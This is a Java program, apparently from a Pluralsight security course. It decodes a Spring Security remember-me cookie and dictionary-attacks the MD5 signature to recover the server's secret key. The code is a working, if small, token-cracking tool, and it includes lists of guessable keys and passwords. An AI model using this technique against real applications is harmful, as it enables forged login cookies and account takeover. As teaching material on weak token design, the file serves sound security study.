package com.pluralsight.security.hacking;

import java.io.UnsupportedEncodingException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;

import org.springframework.security.crypto.codec.Hex;


public class RememberMeInspector {

	//base64(username:expirationTime:md5Hex(username:expirationTime:password:key))

	private static final String content = "dXNlcjoxNTQwOTM4NzY1MzgwOmI2ZTFmYjc1MDcyOTAxZmE4YTIxMTk0ZmE1NWVhMGQ2";
	
	public static void main(String[] args) throws UnsupportedEncodingException {
		String decodedContent = new String(Base64.getDecoder().decode(content));
		System.out.println("Decoded content = "+decodedContent);
		String[] tokens = decodedContent.split(":");
		String username = tokens[0];
		String expiry = tokens[1];
		String md5Hex = tokens[2];
		System.out.println("username = "+username);
		System.out.println("expiry = "+expiry);
		System.out.println("md5Hex = "+md5Hex);
		
		String crackedKey = "";
		for(String key : getDictionaryKeys()) {
			String credentialToken = username+":"+expiry+":{noop}password:"+key;
			System.out.println("Using credentialToken: "+credentialToken);
			if(md5Hex.equals(generateMd5Hex(credentialToken))) {
				crackedKey = key;
				break;
			}
		}
		System.out.println("CRACKED: Key is = "+crackedKey);
	}
	
	private static List<String> getDictionaryKeys() {
		java.util.List<String> passwords = new ArrayList<String>();
		passwords.add("remembermekey");
		passwords.add("remember_me_key");
		passwords.add("REMEMBER_ME_KEY");
		passwords.add("REM_KEY");
		passwords.add("password");
		passwords.add("remember-me-key");
		passwords.add("123456");
		return passwords;
	}
	
	private static List<String> getDictionaryPasswords() {
		java.util.List<String> passwords = new ArrayList<String>();
		passwords.add("123456");
		passwords.add("pa55word");
		passwords.add("qwerty");
		passwords.add("passsword");
		passwords.add("password");
		passwords.add("password1");
		passwords.add("password2");
		return passwords;
	}
	
	private static String generateMd5Hex(String data) {
		MessageDigest digest = null;
		try {
			digest = MessageDigest.getInstance("MD5");
		}
		catch (NoSuchAlgorithmException e) {
			e.printStackTrace();
		}
		return new String(Hex.encode(digest.digest(data.getBytes())));
	}
}
